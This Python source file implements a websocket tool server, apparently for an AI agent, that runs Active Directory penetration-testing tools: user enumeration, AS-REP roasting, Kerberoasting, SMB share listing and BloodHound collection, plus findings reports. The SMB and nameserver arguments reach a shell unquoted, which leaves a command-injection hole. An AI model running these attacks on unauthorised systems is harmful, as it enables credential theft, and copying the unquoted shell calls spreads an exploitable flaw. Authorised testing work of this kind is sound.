#!/usr/bin/env python3

import importlib
import subprocess
import sys
import asyncio
import json
import websockets
import time
import os
import shutil
import shlex
import stat

# --------------------------------------------------------
# CONFIG
# --------------------------------------------------------

vHost = "127.0.0.1"
vPort = 9001 # Puertos: ad(9001), bt(9002), lan(9003), web(9004), wifi(9005)

# --------------------------------------------------------
# HELPERS GENERALES
# --------------------------------------------------------

def fEjecutarComando(vCmd):
  try:
    print(f"[CMD] Ejecutando: {vCmd}")
    v = subprocess.run(vCmd, shell=True, capture_output=True, text=True)
    return v.stdout + "\n" + v.stderr
  except Exception as e:
    return str(e)

def fAsegurarHerramienta(vNombre):
  if not shutil.which(vNombre):
    return False
  return True

# --------------------------------------------------------
# HERRAMIENTAS ACTIVEDIRECTORY (Debian Based)
# --------------------------------------------------------

def fAdEnumDomain(vTarget, vWorkspace):
  vSalidaFile = os.path.join(vWorkspace, "evidence", f"enum4linux_{vTarget}_{int(time.time())}.txt")
  os.makedirs(os.path.dirname(vSalidaFile), exist_ok=True)

  if fAsegurarHerramienta("enum4linux-ng"):
    vCmd = f"enum4linux-ng -A {shlex.quote(vTarget)} -oJ {shlex.quote(vSalidaFile)}"
  elif fAsegurarHerramienta("enum4linux"):
    vCmd = f"enum4linux -a {shlex.quote(vTarget)} > {shlex.quote(vSalidaFile)}"
  else:
    # Fallback to NetExec if installed
    if fAsegurarHerramienta("nxc"): # NetExec se llama nxc ahora
       vCmd = f"nxc smb {shlex.quote(vTarget)} --users" # Basic enum
    else:
       return "ERROR: enum4linux-ng, enum4linux, o NetExec (nxc) no encontrados."

  vSalida = fEjecutarComando(vCmd)
  return f"Enumeración iniciada/completada.\nSalida guardada en: {vSalidaFile}\n{vSalida}"

def fAdKerbruteUserEnum(vTarget, vDomain, vWordlist, vWorkspace):
  if not fAsegurarHerramienta("kerbrute"):
    return "ERROR: kerbrute no encontrado."

  if not vWordlist:
    vWordlist = "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt" 
    # Fallback si no existe
    if not os.path.exists(vWordlist):
        return "ERROR: Wordlist no especificada y default no encontrado."

  vSalidaFile = os.path.join(vWorkspace, "evidence", f"kerbrute_users_{int(time.time())}.txt")
  
  vCmd = f"kerbrute userenum --dc {shlex.quote(vTarget)} -d {shlex.quote(vDomain)} {shlex.quote(vWordlist)} -o {shlex.quote(vSalidaFile)}"
  vSalida = fEjecutarComando(vCmd)
  
  return vSalida

def fAdAsreproast(vTarget, vDomain, vUsersFile, vWorkspace):
  # Usa impacket-GetNPUsers
  if not fAsegurarHerramienta("impacket-GetNPUsers"):
    return "ERROR: impacket-GetNPUsers no encontrado."
  
  vSalidaFile = os.path.join(vWorkspace, "evidence", f"asreproast_{int(time.time())}.txt")
  
  # Si tenemos lista de usuarios, la usamos
  if vUsersFile and os.path.exists(vUsersFile):
      vCmd = f"impacket-GetNPUsers {shlex.quote(vDomain)}/ -usersfile {shlex.quote(vUsersFile)} -dc-ip {shlex.quote(vTarget)} -no-pass -format hashcat -outputfile {shlex.quote(vSalidaFile)}"
  else:
      # Intentar sin usersfile (puede requerir user list via pipe o similar, pero tool standard pide usersfile o listado)
      # Tratamos de enumerar indiscriminadamente si la tool lo permite (GetNPUsers a veces necesita users)
       vCmd = f"impacket-GetNPUsers {shlex.quote(vDomain)}/ -dc-ip {shlex.quote(vTarget)} -no-pass -format hashcat -outputfile {shlex.quote(vSalidaFile)}"

  vSalida = fEjecutarComando(vCmd)
  return f"Ataque AS-REP Roasting ejecutado.\nHashes guardados en: {vSalidaFile}\n{vSalida}"

def fAdKerberoast(vTarget, vDomain, vUsername, vPassword, vWorkspace):
   # Usa impacket-GetUserSPNs
  if not fAsegurarHerramienta("impacket-GetUserSPNs"):
    return "ERROR: impacket-GetUserSPNs no encontrado."
  
  vSalidaFile = os.path.join(vWorkspace, "evidence", f"kerberoast_{int(time.time())}.txt")
  
  # Necesita credenciales validas para pedir TGS
  vCreds = f"{vDomain}/{vUsername}:{vPassword}"
  
  vCmd = f"impacket-GetUserSPNs {shlex.quote(vCreds)} -dc-ip {shlex.quote(vTarget)} -request -outputfile {shlex.quote(vSalidaFile)}"
  
  vSalida = fEjecutarComando(vCmd)
  return f"Ataque Kerberoasting ejecutado.\nHashes guardados en: {vSalidaFile}\n{vSalida}"

def fAdSmbShares(vTarget, vUsername, vPassword, vDomain, vWorkspace):
    # smbclient
    if not fAsegurarHerramienta("smbclient"):
        return "ERROR: smbclient no encontrado."
    
    vCmdAuth = "-N" # Null session default
    if vUsername and vPassword:
        vCmdAuth = f"-U '{vDomain}\\{vUsername}%{vPassword}'"
    
    vCmd = f"smbclient -L {shlex.quote(vTarget)} {vCmdAuth}"
    vSalida = fEjecutarComando(vCmd)
    return vSalida

def fAdBloodhound(vTarget, vDomain, vUsername, vPassword, vNameserver, vWorkspace):
    # bloodhound-python
    if not fAsegurarHerramienta("bloodhound-python"):
        return "ERROR: bloodhound-python no encontrado."
    
    vSalidaDir = os.path.join(vWorkspace, "evidence", "bloodhound_data")
    os.makedirs(vSalidaDir, exist_ok=True)
    
    # Bloodhound python requiere credenciales
    if not all([vUsername, vPassword, vDomain]):
        return "ERROR: Se requieren credenciales (User, Pass, Domain) para BloodHound."

    vNameserverArg = f"-ns {vNameserver}" if vNameserver else ""
    
    # Combiando zip folder output si es posible, o dejandolo en dir
    vCmd = f"bloodhound-python -u {shlex.quote(vUsername)} -p {shlex.quote(vPassword)} -d {shlex.quote(vDomain)} -dc {shlex.quote(vTarget)} {vNameserverArg} -c All --zip -o {shlex.quote(vSalidaDir)}"
    
    vSalida = fEjecutarComando(vCmd)
    return f"Recolección BloodHound completada.\nDatos en: {vSalidaDir}\n{vSalida}"


# --------------------------------------------------------
# REPORT (Reutilizados)
# --------------------------------------------------------

def fReportWrite(vWorkspace, vSection, vContent):
  vReportFile = os.path.join(vWorkspace, "report", "findings.txt")
  os.makedirs(os.path.dirname(vReportFile), exist_ok=True)
  vLinea = f"\n=== {vSection} ===\n{vContent}\n"
  with open(vReportFile, "a") as f:
    f.write(vLinea)
  return {"status": "ok", "written": vLinea}

def fFindingReport(vWorkspace, vTitle, vSeverity, vDescription, vEvidence, vRecommendation):
  """
  Reporta un hallazgo estructurado en findings.txt

  Args:
    vWorkspace: Ruta al workspace
    vTitle: Título del hallazgo
    vSeverity: Severidad (Critical, High, Medium, Low, Info)
    vDescription: Descripción del hallazgo
    vEvidence: Evidencia técnica
    vRecommendation: Recomendación de remediación
  """
  vReportFile = os.path.join(vWorkspace, "report", "findings.txt")
  os.makedirs(os.path.dirname(vReportFile), exist_ok=True)

  vTimestamp = time.strftime('%Y-%m-%d %H:%M:%S')
  vSeverity = vSeverity or "Info"
  vDescription = vDescription or "Sin descripción"
  vEvidence = vEvidence or "Sin evidencia"
  vRecommendation = vRecommendation or "Sin recomendación"

  vFinding = f"""
{'='*70}
[HALLAZGO] {vTitle}
{'='*70}
Fecha/Hora: {vTimestamp}
Severidad:  {vSeverity}

DESCRIPCIÓN:
{vDescription}

EVIDENCIA:
{vEvidence}

RECOMENDACIÓN:
{vRecommendation}
{'='*70}

"""

  with open(vReportFile, "a") as f:
    f.write(vFinding)

  return {
    "status": "ok",
    "message": "Hallazgo reportado exitosamente",
    "severity": vSeverity,
    "title": vTitle,
    "file": vReportFile
  }

def fReportFinalMD(vWorkspace, vContent):
  vReportFile = os.path.join(vWorkspace, "report", "final.md")
  os.makedirs(os.path.dirname(vReportFile), exist_ok=True)
  with open(vReportFile, "w") as f:
    f.write(vContent)
  return {"status": "ok", "path": vReportFile}

def fReportFinalHTML(vWorkspace, vContent):
  vReportFile = os.path.join(vWorkspace, "report", "final.html")
  os.makedirs(os.path.dirname(vReportFile), exist_ok=True)
  with open(vReportFile, "w") as f:
    f.write(vContent)
  return {"status": "ok", "path": vReportFile}


# --------------------------------------------------------
# MANEJO DE SOLICITUDES MCP
# --------------------------------------------------------

async def fHandle(vWS):
  print(f"[MCP] Nueva conexión establecida desde {vWS.remote_address}")

  async for vMensaje in vWS:
    vJSON = json.loads(vMensaje)
    vMethod = vJSON.get("method")
    vID = vJSON.get("id")

    print(f"[MCP] Petición recibida: {vMethod}")

    if vMethod == "tools/list":
      vRespuesta = {
        "jsonrpc": "2.0",
        "id": vID,
        "result": {
          "tools": [
            {"name": "ad.enum_domain"},
            {"name": "ad.kerbrute_userenum"},
            {"name": "ad.asreproast"},
            {"name": "ad.kerberoast"},
            {"name": "ad.smb_shares"},
            {"name": "ad.bloodhound"},
            {"name": "finding.report"},
            {"name": "report.write"},
            {"name": "report.final_md"},
            {"name": "report.final_html"}
          ]
        }
      }
      await vWS.send(json.dumps(vRespuesta))
      continue

    if vMethod == "tools/call":
      vTool = vJSON["params"]["tool"]
      vArgs = vJSON["params"]["arguments"]

      print(f"[MCP] Ejecutando herramienta: {vTool}")

      vOutput = {}

      if vTool == "ad.enum_domain":
        vOutput = fAdEnumDomain(
          vArgs.get("target"), 
          vArgs.get("workspace")
        )

      elif vTool == "ad.kerbrute_userenum":
        vOutput = fAdKerbruteUserEnum(
          vArgs.get("target"), 
          vArgs.get("domain"), 
          vArgs.get("wordlist"),
          vArgs.get("workspace")
        )

      elif vTool == "ad.asreproast":
        vOutput = fAdAsreproast(
          vArgs.get("target"), 
          vArgs.get("domain"), 
          vArgs.get("users_file"),
          vArgs.get("workspace")
        )

      elif vTool == "ad.kerberoast":
        vOutput = fAdKerberoast(
          vArgs.get("target"), 
          vArgs.get("domain"), 
          vArgs.get("username"),
          vArgs.get("password"),
          vArgs.get("workspace")
        )

      elif vTool == "ad.smb_shares":
        vOutput = fAdSmbShares(
          vArgs.get("target"), 
          vArgs.get("username"),
          vArgs.get("password"),
          vArgs.get("domain"),
          vArgs.get("workspace")
        )

      elif vTool == "ad.bloodhound":
        vOutput = fAdBloodhound(
          vArgs.get("target"), 
          vArgs.get("domain"), 
          vArgs.get("username"),
          vArgs.get("password"),
          vArgs.get("nameserver"),
          vArgs.get("workspace")
        )

      elif vTool == "finding.report":
        vOutput = fFindingReport(
          vArgs["workspace"],
          vArgs["title"],
          vArgs.get("severity", "Info"),
          vArgs.get("description", ""),
          vArgs.get("evidence", ""),
          vArgs.get("recommendation", "")
        )

      elif vTool == "report.write":
        vOutput = fReportWrite(vArgs["workspace"], vArgs["section"], vArgs["content"])

      elif vTool == "report.final_md":
        vOutput = fReportFinalMD(vArgs["workspace"], vArgs["content"])

      elif vTool == "report.final_html":
        vOutput = fReportFinalHTML(vArgs["workspace"], vArgs["content"])

      # Enviar respuesta
      vRespuesta = {
        "jsonrpc": "2.0",
        "id": vID,
        "result": {"output": vOutput}
      }
      await vWS.send(json.dumps(vRespuesta))
      continue


# --------------------------------------------------------
# MAIN SERVER
# --------------------------------------------------------

async def main():
  print(f"\n{'='*60}")
  print(f"MCP AD Pentesting Server")
  print(f"{'='*60}")
  print(f"Escuchando en: ws://{vHost}:{vPort}")
  print(f"Estado: ACTIVO")
  print(f"{'='*60}\n")
  print("Esperando conexiones...\n")

  async with websockets.serve(fHandle, vHost, vPort):
    await asyncio.Future()

if __name__ == "__main__":
  asyncio.run(main())
